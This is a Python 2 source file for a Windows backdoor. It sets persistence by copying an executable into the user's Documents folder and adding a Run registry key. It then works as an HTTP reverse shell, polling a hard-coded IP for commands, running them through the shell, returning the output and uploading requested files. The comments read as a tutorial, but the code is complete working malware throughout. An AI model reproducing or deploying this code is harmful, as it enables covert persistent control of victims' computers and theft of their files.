import os               #Get the current working directory from where scrpt is being executed
import subprocess       # needed for getting user profile
import _winreg as wreg  # needed for editing registry DB
import shutil           # needed for file copying
import time
import requests
import random


def persistence():
    # Reconnaissance Phase
    current_directory = os.getcwd() # Gets the current working directory e.g. 'C:\\Users\\IEUser\\Desktop'

    # set USERPROFILE in cmd will return "USERPROFILE=C:\Users\IEUser"
    # output variable will store "USERPROFILE=C:\Users\IEUser"
    output = subprocess.check_output('set USERPROFILE', shell=True, )

    # profile variable will store "C:\Users\IEUser"
    output = output.split('=')
    profile = output[1]

    # set the destination as C:\Users\IEUser\Documents\persistent.exe
    destination = profile.strip('\n\r') + '\\Documents\\'  +'persistent.exe'

    # Check whether putty.exe is present on the system. i.e first time target system is accessed
    if not os.path.exists(destination):
        # Accessing first time the target system
        # Copy the backdoor (putty.exe) to the target location
        shutil.copyfile(current_directory+'\persistent.exe', destination)


        # Add the new registery with name 'RegPersistent' for the current user and point it to backdoor
        # Path of registery HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegPersistent', 0, wreg.REG_SZ,destination)
        key.Close()


#HTTP Reverse shell
def connect():
    while True: 

        req = requests.get('http://192.168.57.129')
        command = req.text
        
        if 'close' in command:
            return 1

        # Data Exfilteration
        elif 'grab' in command:
            grab,path = command.split(' ')

            #Check if file exists
            try:
                if os.path.exists(path):
                    url = 'http://192.168.57.129/doc'  # /doc in the URL indicates a document has been attached
                    files = {'file': open(path, 'rb')}
                    r = requests.post(url, files=files)

                else:
                    post_response = requests.post(url='http://192.168.57.129', data='File not found on the target' )
            except Exception,e:
                post_response = requests.post(url='http://192.168.57.129', data=str(e) )
  
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url='http://192.168.57.129', data=CMD.stdout.read() )
            post_response = requests.post(url='http://192.168.57.129', data=CMD.stderr.read() )

        time.sleep(3)


persistence()
while True:
    try:
        if connect() == 1 :
            break;
    except:
        #wait for random time interval
        sleep_for = random.randrange(1,10)
        time.sleep(sleep_for) # sleep for 1-10 seconds
        pass #do nothing. do not log anything
    
